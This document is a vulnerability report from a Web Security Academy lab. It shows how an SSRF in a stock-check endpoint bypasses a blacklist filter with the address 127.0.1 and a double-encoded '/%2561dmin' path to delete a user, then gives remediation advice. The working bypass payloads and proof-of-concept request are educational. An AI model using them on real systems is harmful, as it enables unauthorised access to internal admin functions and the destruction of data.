# Vulnerability Report: SSRF via Blacklist Filter Bypass

**Severity:** High  
**CVSS Score:** 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)  
**Date:** 2026-08-04  
**Target:** `<target>.web-security-academy.net`

---

## Executive Summary

A Server-Side Request Forgery (SSRF) vulnerability was identified in the stock check functionality of the application.
The endpoint accepts a fully user-controlled URL via the `stockAPI` parameter and makes a server-side HTTP request to it.
A blacklist-based filter attempts to block access to internal addresses, but it can be bypassed using alternative representations of `127.0.0.1` and double URL encoding on the admin path.
By chaining these two bypasses, an unauthenticated attacker can reach the internal admin panel and perform privileged actions — including deleting arbitrary user accounts.
In this case, the user `carlos` was deleted through a forged request to the internal admin endpoint.

---

## Vulnerability Details

| Field | Value |
|-------|-------|
| Type | Server-Side Request Forgery (SSRF) |
| Endpoint | `POST /product/stock` |
| Method | POST |
| Parameter | `stockAPI` |
| Protection | Blacklist-based filter blocking `localhost`, `127.0.0.1`, and `/admin` |
| Bypass | Alternative localhost representation (`127.0.1`) + double URL encoding on path (`%2561dmin`) |
| Requirement | No authentication required |
| User Interaction | Not required |

---

## Steps to Reproduce

1. Open any product page and click "Check stock" — a `POST /product/stock` request is sent with a `stockAPI` parameter containing a full URL.
2. Intercept the request in Burp Suite and send it to Repeater.
3. Replace the `stockAPI` value with `http://localhost/admin` — the server returns `400 Bad Request: External stock check blocked for security reasons`.
4. Replace `localhost` with `127.0.1` — the server returns `200 OK` with the admin panel HTML, confirming the localhost filter is bypassed.
5. Append `/admin` to the URL — the server returns a restricted message, confirming a second filter on the path.
6. Replace `/admin` with `/%2561dmin` (double URL encoded `a`) — the server returns the full admin panel.
7. Locate the delete link for user `carlos` in the admin panel response — it references `/admin/delete?username=carlos`.
8. Set `stockAPI` to `http://127.0.1/%2561dmin/delete?username=carlos` and send the request.
9. The server processes the request, deletes the user, and the lab is solved.

---

## Proof of Concept

**Stock check request with SSRF payload:**
```http
POST /product/stock HTTP/2
Host: <target>.web-security-academy.net
Cookie: session=<YOUR_SESSION>
Content-Type: application/x-www-form-urlencoded

stockAPI=http://127.0.1/%2561dmin/delete?username=carlos
```

**Filter bypass progression:**
```
http://localhost/admin          →  400 Blocked (localhost + /admin both caught)
http://127.0.1/admin           →  200 OK      (localhost filter bypassed)
http://127.0.1/%61dmin         →  400 Blocked (single encoding decoded before check)
http://127.0.1/%2561dmin       →  200 OK      (double encoding bypasses path filter)
http://127.0.1/%2561dmin/delete?username=carlos  →  User deleted, lab solved
```

---

## Impact

An attacker can force the server to make HTTP requests to any internal address it has network access to — including services that are not exposed externally.
In this case, the internal admin panel had no authentication of its own, relying entirely on network-level isolation that SSRF renders meaningless.

In a real application, this would result in:
- Full access to internal admin functionality with no authentication required
- Ability to create, modify, or delete user accounts and application data
- Access to internal services, metadata endpoints, and other backend systems on the same network
- In cloud environments, access to instance metadata (e.g., AWS `169.254.169.254`) can expose IAM credentials, leading to full account compromise
- The forged requests originate from the server itself, making them indistinguishable from legitimate internal traffic

---

## Remediation

- Do not use blacklists for SSRF protection — the bypass surface is too large to cover reliably.
- Use a strict whitelist of allowed destinations for any server-side HTTP requests.
- Resolve DNS and normalize URLs fully — including multiple decode passes — before applying any security checks.
- Block all private IP ranges at the network level, not the application level, using firewall rules or an outbound proxy.
- Internal services and admin panels must enforce their own authentication and not rely on network isolation alone.
- If the stock check feature requires calling an external service, restrict outbound traffic to only that specific destination via an egress proxy.

---

## References

- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-184: Incomplete List of Disallowed Inputs
- CWE-116: Improper Encoding or Escaping of Output
- OWASP Top 10 A10:2021 — Server-Side Request Forgery
- PortSwigger: Server-Side Request Forgery